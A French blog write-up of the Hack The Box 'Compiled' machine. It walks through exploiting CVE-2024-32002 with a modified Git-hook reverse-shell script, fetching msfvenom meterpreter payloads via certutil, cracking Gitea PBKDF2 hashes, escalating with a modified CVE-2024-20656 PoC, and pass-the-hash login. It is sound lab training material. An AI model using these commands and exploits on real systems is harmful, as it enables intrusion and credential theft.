---
date: 2024-12-13T13:44:19-06:00
# description: ""
image: "/images/HTB-Compiled/Compiled.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Compiled"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Compiled](https://app.hackthebox.com/machines/Compiled)
* Niveau: Moyen
* OS: Windows
---

Compiled débute par la découverte d'une instance Gitea sur le port 3000 et d'un service de compilation sur le port 5000. En exploitant une vulnérabilité de Git (`CVE-2024-32002`), nous obtenons un accès initial. En explorant le système, nous découvrons un fichier de base de données contenant des hachages d'utilisateurs et d'autres informations critiques, nous permettant de trouver un mot de passe et d'effectuer un mouvement latéral. L'énumération du système mène à des fichiers liés à Visual Studio 2019, conduisant à la découverte du `CVE-2024-20656`. En personnalisant et en compilant une preuve de concept (PoC), nous exploitons un service s'exécutant en tant que `LocalSystem` pour accéder au compte root.

Adresse IP cible - `10.10.11.26`

## Balayage 

```
nmap -sC -sV -Pn -oA nmap/Compiled 10.10.11.26
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 14:21 CST
Nmap scan report for 10.10.11.26
Host is up (0.072s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=7f989393b9d73791; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=aVSW1KqfHyBa9Imz4uy8TuiagFw6MTczNDAzNDk3NjkzNjg4NjkwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 12 Dec 2024 20:22:56 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-arc-green">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Git</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=7277a535e35440ef; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=jbSopQ2xI6EjIO9rUIzxJnkVP-I6MTczNDAzNDk4MjU2NzU3OTcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 12 Dec 2024 20:23:02 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Thu, 12 Dec 2024 20:22:56 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5234
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Compiled - Code Compiling Services</title>
|     <!-- Bootstrap CSS -->
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
|     <!-- Custom CSS -->
|     <style>
|     your custom CSS here */
|     body {
|     font-family: 'Ubuntu Mono', monospace;
|     background-color: #272822;
|     color: #ddd;
|     .jumbotron {
|     background-color: #1e1e1e;
|     color: #fff;
|     padding: 100px 20px;
|     margin-bottom: 0;
|     .services {
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.94SVN%I=7%D=12/12%Time=675B4620%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,37D5,"HTTP/1\.0\x20200\x20OK\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gi
SF:tea=7f989393b9d73791;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Co
SF:okie:\x20_csrf=aVSW1KqfHyBa9Imz4uy8TuiagFw6MTczNDAzNDk3NjkzNjg4NjkwMA;\
SF:x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Op
SF:tions:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2012\x20Dec\x202024\x2020:22:56\
SF:x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"th
SF:eme-arc-green\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\">\n\t<title>Git</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21w
SF:aWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGV
SF:kLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2
SF:l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwM
SF:DA")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20Al
SF:lowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Con
SF:trol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\n
SF:Set-Cookie:\x20i_like_gitea=7277a535e35440ef;\x20Path=/;\x20HttpOnly;\x
SF:20SameSite=Lax\r\nSet-Cookie:\x20_csrf=jbSopQ2xI6EjIO9rUIzxJnkVP-I6MTcz
SF:NDAzNDk4MjU2NzU3OTcwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2012\x20
SF:Dec\x202024\x2020:23:02\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.94SVN%I=7%D=12/12%Time=675B4621%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,1521,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.
SF:3\x20Python/3\.12\.3\r\nDate:\x20Thu,\x2012\x20Dec\x202024\x2020:22:56\
SF:x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Lengt
SF:h:\x205234\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20
SF:lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20
SF:\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Compiled\x20-\x20Code
SF:\x20Compiling\x20Services</title>\n\x20\x20\x20\x20<!--\x20Bootstrap\x2
SF:0CSS\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"http
SF:s://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min\.
SF:css\">\n\x20\x20\x20\x20<!--\x20Custom\x20CSS\x20-->\n\x20\x20\x20\x20<
SF:style>\n\x20\x20\x20\x20\x20\x20\x20\x20/\*\x20Add\x20your\x20custom\x2
SF:0CSS\x20here\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20'Ubuntu\x20Mon
SF:o',\x20monospace;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20back
SF:ground-color:\x20#272822;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20color:\x20#ddd;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\.jumbotron\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20background-color:\x20#1e1e1e;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20padding:\x20100px\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20margin-bottom:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20}\n\x20\x20\x20\x20\x20\x20\x20\x20\.services\x20{\n\x20")%r(RTSPRequ
SF:est,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<he
SF:ad>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x
SF:20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x2
SF:0code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x
SF:20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\
SF:x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>
SF:\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.50 seconds
```

Nous trouvons deux ports ouverts 3000 et 5000, nmap n'est pas en mesure de fournir des informations précises sur les services fonctionnant sur ces ports.

## Enumération

À `http://compiled.htb:3000/`, nous trouvons une instance de Gitea.

![Gitea instance](/images/HTB-Compiled/gitea_instance.png)

À `http://compiled.htb:5000/`, nous trouvons un site web offrant des services de compilation.

![Compiled website](/images/HTB-Compiled/compiled_website.png)

Dans la section `Explore` de Gitea nous trouvons deux dépôts, un pour le site web sur le port 5000 et un autre pour un programme de calculatrice.

![Repository list](/images/HTB-Compiled/repository_list.png)

Pour utiliser l'application sur le port 5000, nous devons fournir une URL pour un dépôt Github se terminant par `.git`.

![Compiled usage instructions](/images/HTB-Compiled/compiled_usage.png)

Dans le dépôt de la calculatrice, nous trouvons une version pour Git (2.45.0.windows.1).

![Git version](/images/HTB-Compiled/git_version.png)

Après avoir cherché `git version 2.45.0 cve` sur Google, nous trouvons le [CVE-2024-32002](https://www.cvedetails.com/cve/CVE-2024-32002/) avec un PoC disponible [ici](https://amalmurali.me/posts/git-rce/).

### Explication de l'exploitation

Notre processus d'exploitation s'appuie sur une vulnérabilité de Git (CVE-2024-32002) résultant d'une mauvaise gestion des liens symboliques dans les systèmes de fichiers qui ne font pas la différence entre majuscules et minuscules (ce qui signifie que des chemins tels que `A/modules/x` et `a/modules/x` sont traités comme étant identiques). Cette vulnérabilité nous permet de manipuler Git pour qu'il écrive des fichiers dans le répertoire `.git/`.

Le processus consiste à créer un dépôt malveillant (`scorpion`) avec un post-checkout hook contenant un reverse shell payload. Ce hook est configuré pour s'exécuter lors d'opérations Git spécifiques, comme checkout. Nous utilisons ensuite `git submodule add` pour lier `scorpion` en tant que submodule d'un autre dépôt, `venom`. De cette manière, lorsque le sous-module est traité, le payload de `scorpion` est déclenché.

Un aspect essentiel de l'exploit consiste à exploiter la possibilité de Git de mettre à jour le répertoire `.git/` par le biais de liens symboliques. En créant un lien symbolique pointant vers `dotgit.txt`, nous trompons Git en traitant le contenu manipulé comme des métadonnées légitimes. Les contrôles de validation sont ainsi contournés, ce qui nous permet de placer notre payload dans le répertoire `.git/hooks`.

Enfin, nous soumettons l'URL du dépôt `venom` dans l'application cible qui clone et compile les dépôts. Au cours du processus de clonage, Git traite le sous-module et rencontre le hook malveillant post-checkout dans `scorpion`. Ce hook exécute notre payload, et établit une connexion avec notre listener.

## Accès initial

Tout d'abord, nous devons enregistrer un nouveau compte sur l'instance gitea.

![Gitea account creation](/images/HTB-Compiled/gitea_account_creation.png)

Nous créons également deux dépôts.

![Gitea exploit repositories](/images/HTB-Compiled/exploit_repos.png)

[Ici](https://github.com/amalmurali47/git_rce/blob/main/create_poc.sh), nous trouvons le script Bash utilisé pour le PoC, nous le modifions pour nos besoins.

Comme nous utilisons probablement un nouveau compte git, nous devons d'abord vérifier notre identité avec:

```
git config --global user.email "you@example.com"
git config --global user.name "Your Name"
```

Vous trouverez ci-dessous le script exact que j'ai utilisé, vous devez y ajouter une commande de reverse shell.

> Si vous avez choisi des noms différents pour vos dépôts, vous devrez les modifier dans le script.

```bash
#!/bin/bash

# Configure Git settings for exploitation
git config --global protocol.file.allow always
git config --global core.symlinks true
git config --global init.defaultBranch main

# Clone the malicious repository (scorpion)
git clone http://compiled.htb:3000/kscorpio/scorpion.git
cd scorpion

# Set up the post-checkout hook with the reverse shell payload
mkdir -p y/hooks
cat >y/hooks/post-checkout <<EOF
#!/bin/sh
<INSERT YOUR PowerShell #3 (Base64) reverse shell from revshells.com here>
EOF

# Make the hook executable
chmod +x y/hooks/post-checkout

# Commit the hook to the repository
git add y/hooks/post-checkout
git commit -m "post-checkout"
git push

# Clone the venom repository and add the malicious submodule
cd ..
git clone http://compiled.htb:3000/kscorpio/venom.git
cd venom
git submodule add --name x/y "http://compiled.htb:3000/kscorpio/scorpion.git" A/modules/x

# Commit and push the submodule addition
git commit -m "add-submodule"
printf ".git" >dotgit.txt
git hash-object -w --stdin <dotgit.txt >dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info
git update-index --index-info <index.info
git commit -m "add-symlink"
git push
```

![exploit script execution](/images/HTB-Compiled/exploit_script.png)

Après avoir exécuté le script, nous soumettons le lien de notre second dépôt à `http://compiled.htb:5000/`.

![malicious url](/images/HTB-Compiled/malicious_url.png)

Quelques instants après, nous obtenons un shell sous le nom de `Richard`.

![initial foothold](/images/HTB-Compiled/initial_foothold.png)

Le drapeau utilisateur n'est pas sur ce compte, nous devons donc chercher ailleurs. Il y a un autre utilisateur appelé `Emily` sur la cible, nous devons probablement accéder à ce compte.

Avec [winPEAS](https://github.com/peass-ng/PEASS-ng/releases/tag/20241205-c8c0c3e5), nous apprenons que `Emily` est actuellement connectée sur le système et que `Richard` a un accès complet à `C:\Program Files\Gitea` que nous explorerons plus en détail.

![Logged users](/images/HTB-Compiled/logged_users.png)

![Gitea directory](/images/HTB-Compiled/Gitea_directory.png)

### Mouvement latéral (shell en tant que Emily)

Dans `C:\Program Files\Gitea\data` nous trouvons le fichier `gitea.db`. Si Emily a un compte sur l'instance Gitea, nous pourrions y trouver ses identifiants.

![Gitea db file](/images/HTB-Compiled/gitea_db.png)

Pour télécharger le fichier, nous passons à un shell meterpreter.

Créez un fichier exécutable et l'envoyer à la cible.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER -f exe -o payload.exe


certutil.exe -urlcache -split -f http://WEBSERVER_IP:PORT_NUMBER/payload.exe payload.exe
```

![malicious exe file](/images/HTB-Compiled/msf_exe.png)

Configurez le listener dans Metasploit.

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <YOUR_IP>
set lport <PORT_NUMBER>
run
```

Après avoir exécuté le fichier `.exe` sur la cible, nous obtenons un shell meterpreter. Nous pouvons maintenant facilement télécharger `gitea.db` avec `download "C:\Program Files\Gitea\data\Ngitea.db"`.

![Gitea db file download](/images/HTB-Compiled/gitea_db_download.png)

Nous exécutons les requêtes suivantes et obtenons les hachages des utilisateurs.

```
sqlite3 gitea.db

.tables

select * FROM user;
```

![hashes in the gitea.db file](/images/HTB-Compiled/hashes_in_giteadb.png)

Il s'agit de hachages PBKDF2.

> PBKDF2 (Password-Based Key Derivation Function 2) est un algorithme cryptographique utilisé pour dériver des clés cryptographiques sécurisées à partir d'un mot de passe. Il applique une fonction pseudo-aléatoire (telle que HMAC) de manière itérative au mot de passe ainsi qu'à un sel (une valeur aléatoire) pour générer une clé. Le processus est répété de nombreuses fois (souvent des milliers ou des dizaines de milliers d'itérations) afin de ralentir les attaques par force brute et de rendre plus difficile la récupération du mot de passe original par les attaquants.

Cette [page de hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) nous apprend que le hash doit respecter ce format: 
`<HASH_ALGORITHM>:<NUMBER_OF_ITERATIONS>:<base64_SALT>:<base64_hash>`. Par exemple:

```
sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
```

Hashcat prend beaucoup de temps pour cracker le hash, ce qui est inhabituel pour HackTheBox, nous arrêtons donc le processus et utilisons une autre méthode.

![hashcat cracking process taking too long](/images/HTB-Compiled/hashcat_toolong.png)

J'ai demandé à ChatGPT un script Python pour trouver le mot de passe. Cette solution est possible car nous disposons déjà de toutes les informations dont nous avons besoin :
* L'algorithme: pbkdf2
* La valeur du hachage: `97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16`
* Le nombre d'itérations: 50000
* La valeur du sel: `227d873cca89103cd83a976bdac52486`
* La longueur de la clé: 50

```python
import hashlib

def pbkdf2_decrypt(hash_value, salt, iterations, key_length, wordlist_path):
    # Convert the salt and hash to bytes (hex decoding)
    salt = bytes.fromhex(salt)
    hash_value = bytes.fromhex(hash_value)
    
    # Open the wordlist file
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as wordlist:
        for word in wordlist:
            word = word.strip()  # Remove any trailing spaces or newline characters
            
            # Hash the current word using PBKDF2 with HMAC SHA256
            derived_key = hashlib.pbkdf2_hmac('sha256', word.encode(), salt, iterations, dklen=key_length)
            
            # Check if the derived key matches the target hash
            if derived_key == hash_value:
                print(f"Password found: {word}")
                return word  # Return the password if it matches
        print("Password not found in the wordlist.")
        return None  # Return None if no match is found

# Example of usage
hash_value = '97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16'
salt = '227d873cca89103cd83a976bdac52486'
iterations = 50000
key_length = 50  # The length of the derived key in bytes
wordlist_path = '/usr/share/wordlists/rockyou.txt'  # Path to the wordlist

# Call the function to start the cracking process
password = pbkdf2_decrypt(hash_value, salt, iterations, key_length, wordlist_path)
```

Grâce au script, nous trouvons le mot de passe: `12345678`.

![Emily password found](/images/HTB-Compiled/emily_pwd.png)

Nous utilisons `RunasCs.exe` pour obtenir un shell sous le nom de `Emily` avec la commande ci-dessous.

```
.\runascs.exe Emily "12345678" powershell -r 10.10.14.231:5555
```

![Emily RunasCs shell](/images/HTB-Compiled/emily_rcs_shell.png)

Il est également possible de se connecter sous le nom de `Emily` via `evil-winrm`, et le drapeau utilisateur se trouve dans `C:\Users\Emily\Desktop`.

```
evil-winrm -u "Emily" -p "12345678" -i compiled.htb
```

![Emily shell](/images/HTB-Compiled/emily_shell.png)

## Elévation de Privilèges

Nous relançons [winPEAS](https://github.com/peass-ng/PEASS-ng/releases/tag/20241205-c8c0c3e5) et trouvons une information relative à Microsoft Visual Studio.

```
File Permissions "C:\Users\All Users\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe": Authenticated Users [WriteData/CreateFiles]
```

![MS Visual Studio winpeas](/images/HTB-Compiled/MVS_2019.png)

Dans `C:\Users\Emily\Documents`, nous trouvons également un répertoire pour `Visual Studio 2019`.

![VS Studio 2019](/images/HTB-Compiled/VS_Studio_2019.png)

En cherchant `MofCompiler.exe cve` sur Google, nous trouvons le [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) avec un PoC [ici](https://github.com/ruycr4ft/CVE-2024-20656/tree/main).

Comme indiqué dans l'article, `VSStandardCollectorService150` est exécuté sous le compte `LocalSystem` sur notre cible.

![VSStandardCollectorService150](/images/HTB-Compiled/VSStandard_service.png)

Nous devons modifier l'exploit pour qu'il fonctionne. En examinant le contenu de `main.cpp` sur le dépôt Github du PoC, nous remarquons que l'emplacement de `VSDiagnostics.exe` est référencé. Nous devons modifier cette ligne avec le bon répertoire et la bonne année (2019 dans notre cas).

> `VSDiagnostics.exe` est un outil de diagnostic inclus dans Microsoft Visual Studio. Il est principalement utilisé pour analyser et résoudre les problèmes dans Visual Studio ou dans les applications développées à l'aide de Visual Studio.

![MSVS location](/images/HTB-Compiled/MSVS_location.png)

```
WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
```

Nous devons également modifier la fonction `cb1` avec le chemin d'accès à notre fichier exe malveillant. Ce fichier sera copié et renommé en `MofCompiler.exe` lorsque nous exécuterons le service.

![cb1 function](/images/HTB-Compiled/cb1_function.png)

```
CopyFile(L"c:\\tmp\\rev.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
```

Pour obtenir le fichier `Expl.exe`, nous devons compiler le projet spécifiquement pour la version 2019 avec Visual Studio (ce qui nécessite une machine Windows).

Si vous avez Visual Studio 2022 comme moi, vous devrez spécifier le Toolset 2019 pour la compilation. Sur votre machine Windows, trouvez `vs_installer.exe`, le mien se trouve dans `C:\Program Files (x86)\Microsoft Visual Studio\Installer`.

![vs installer](/images/HTB-Compiled/vs_installer.png)

Après l'avoir ouvert, sélectionnez `Modify`.

![vs modify](/images/HTB-Compiled/vsstudio_modify.png)

Ensuite, allez dans la section `Individual Components`, recherchez `v142`, sélectionnez `MSVC v142 - VS 2019 C++ x64/x86 build tools` et cliquez sur `Modify` pour installer les composants.

![v142 build tools](/images/HTB-Compiled/v142.png)

Clonez le dépôt du PoC, lancez Visual Studio et sélectionnez `Open a project or solution` (Ouvrir un projet ou une solution). Trouvez le répertoire `CVE-2024-20656` et ouvrez le fichier `Expl.sln` dans le répertoire `Expl`. Vous devriez maintenant avoir tous les fichiers ouverts dans le menu `Solution Explorer`.

![Solution Explorer](/images/HTB-Compiled/SE_menu.png)

Faites un clic droit sur le menu `Solution Explorer` et sélectionnez `Properties` en bas. Vous pouvez aussi utiliser `Alt + Enter` pour faire la même chose. 

Sous `Configuration Properties` -> `General`, configurez le `Platform Toolset` sur `Visual Studio 2019 (v142)` et cliquez sur `Apply`.

![v142 apply](/images/HTB-Compiled/v142_apply.png)

Cliquez maintenant sur `main.cpp` pour commencer à le modifier. Voici la première modification:

![WCHAR modification](/images/HTB-Compiled/WCHAR_modification.png)

Et voici le deuxième:

> Vous pouvez choisir n'importe quel emplacement pour le fichier malveillant, mais assurez-vous que vous avez toutes les permissions sur le répertoire.

![void cb1 modification](/images/HTB-Compiled/cb1_modification.png)

Pour compiler le projet, cliquez sur `Build` dans le menu tout en haut -> `Batch Build` -> cochez `Release|x64` -> et cliquez sur `Build`.

![compiling process](/images/HTB-Compiled/compiling.png)

Une fois la compilation réussie, nous avons un nouveau répertoire appelé `x64` et à l'intérieur du répertoire `Release` se trouve notre fichier `Expl.exe`.

![Expl.exe file](/images/HTB-Compiled/expl_exe.png)

Créez le fichier malveillant `rev.exe` avec msfvenom.

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=PORT_NUMBER -f exe -o rev.exe
```

![malicious exe file](/images/HTB-Compiled/bad_exe.png)

Préparez le listener dans Metasploit.

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <YOUR_IP>
set lport <PORT_NUMBER>
run
```

**Pour les étapes suivantes, assurez-vous d'avoir à la fois un shell RunasCs et un shell evil-winrm pour Emily.**

Avec le shell RunasCs, créez le répertoire `tmp` dans `C:\` et placez-y `rev.exe` et `Expl.exe`.

![tmp directory](/images/HTB-Compiled/tmp_directory.png)

Exécutez la commande suivante dans le shell evil-winrm:

```
./RunasCs.exe Emily "12345678" C:\tmp\Expl.exe
```

Après environ une minute, nous obtenons un shell meterpreter en tant que `NT AUTHORITY\SYSTEM`, et trouvons le drapeau root dans `C:\Users\Administrator\Desktop`.

![root shell](/images/HTB-Compiled/root_shell.png)

![root flag](/images/HTB-Compiled/root_flag.png)

De plus, nous pouvons utiliser `hashdump` pour obtenir tous les hashs des utilisateurs.

![hashdump](/images/HTB-Compiled/hashdump.png)

Avec le hash de l'administrateur, nous pouvons nous connecter via evil-winrm. C'est une façon d'établir la persistance afin de ne pas avoir à répéter le processus d'exploitation.

```
evil-winrm -i compiled.htb -u Administrator -H f75c95bc9312632edec46b607938061e
```

![evil-winrm root shell](/images/HTB-Compiled/root_evil-winrm.png)

Je vous remercie d'avoir lu cet article et j'espère qu'il vous a été utile!

